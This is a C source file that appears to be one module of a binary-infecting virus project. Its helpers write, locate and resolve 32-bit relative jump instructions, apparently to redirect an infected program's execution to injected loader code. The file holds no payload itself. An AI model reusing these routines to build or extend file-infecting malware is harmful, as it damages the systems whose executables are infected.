#include <stdint.h>
#include <stdbool.h>
#include "disasm.h"
#include "compiler_utils.h"
#include "errors.h"
#include "jumps.h"

bool	write_jump32(struct safe_ptr ref, size_t offset, int32_t value)
{
	uint8_t	*jump_opcode = safe(ref, offset, JUMP32_INST_SIZE);
	int32_t	*jump_value  = (int32_t*)(jump_opcode + 1);

	if (jump_opcode == NULL)
		return errors(ERR_VIRUS, _ERR_V_CANT_READ_JUMP);

	*jump_opcode = 0xe9;
	*jump_value  = value;

	return true;
}

bool	write_jump32_value(struct safe_ptr ref, size_t offset, int32_t value)
{
	void	*jump_value = safe(ref, offset, DWORD);

	if (jump_value == NULL)
		return errors(ERR_VIRUS, _ERR_V_CANT_READ_JUMP);

	*(int32_t*)(jump_value) = value;

	return true;
}

void	*find_first_jump32(struct safe_ptr ref, size_t offset)
{
	uint8_t	*code = safe(ref, offset, INSTRUCTION_MAXLEN);

	while (true)
	{
		if (code == NULL)
		{
			errors(ERR_VIRUS, _ERR_V_CANT_READ_LOADER_CODE);
			goto error;
		}
		if (!known_instruction(code, INSTRUCTION_MAXLEN))
		{
			errors(ERR_THROW, _ERR_T_FIND_FIRST_JUMP32);
			goto error;
		}
		if (is_jump32(*code))
			return code;

		code = step_instruction(code, INSTRUCTION_MAXLEN);
	}
error:
	return NULL;
}

void	*get_jump32_destination(struct safe_ptr ref, size_t offset)
{
	uint8_t	*jump_opcode = safe(ref, offset, JUMP32_INST_SIZE);
	int32_t	*jump_value  = (int32_t*)(jump_opcode + 1);

	if (jump_opcode == NULL)
	{
		errors(ERR_VIRUS, _ERR_V_CANT_READ_JUMP);
		return NULL;
	}
	return ((jump_opcode + JUMP32_INST_SIZE) + *jump_value);
}
